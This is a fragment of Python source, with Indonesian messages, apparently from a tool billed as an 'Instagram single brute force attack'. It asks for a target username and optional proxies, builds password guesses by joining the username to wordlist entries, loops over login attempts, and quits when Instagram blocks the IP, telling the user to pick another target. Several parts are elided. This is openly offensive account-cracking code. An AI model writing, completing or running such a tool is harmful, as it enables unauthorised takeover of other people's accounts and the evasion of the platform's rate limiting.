...
def print_login_failed(password, verbose, proxy, proxies, login_response_status_code):
    if proxy:
        printit("Status  : ["+str(proxies['http'])+"] Login Gagal dengan pw : "+password+"", coledt=[1, 49, 93], hide=True, verbose_mode=verbose)
    else:
        printit("Status  : ["+str(login_response_status_code)+"] Login Gagal dengan pw : "+password+"", coledt=[1, 49, 93], hide=True, verbose_mode=verbose)

def insta():
#========================[Dump Insta Coy]===============================
	cetak(panel(f"[bold green]		INSTAGRAM SINGLE BRUTE FORCE ATTACK",style="bold red"))
	username = input("Masukkan Username Target: ")
	cetak(panel(f"[bold green]		Apakah Anda Ingin Menggunakan Proxy Manual??  Y/N",style="bold red"))
	proski = input("[+] Choice Menu  : ")
	if proski == 'y':
		proxy = True
		proxy_file = input("Masukan Proxy Atau File Proxy  : ")
	else:
		proxy = False
		proxy_file = False
	pw = """01
	...
	cetak(panel(f"		Memulai Brute Force Pada Akun "+username,style="bold red"))

	if verbose and timeout != 2: print("Semoga Beruntung")
	...
	for password in wordlist:
		...
		password = username + password.strip()
		...
		if login_response.status_code == 403 or login_response.status_code == "403":
			printit("\n["+str(login_response.status_code)+"]: IP DI BLOKIR IG COYYYY..Sebaiknya Gnti target", coledt=[4, 49, 91])
			sys.exit()
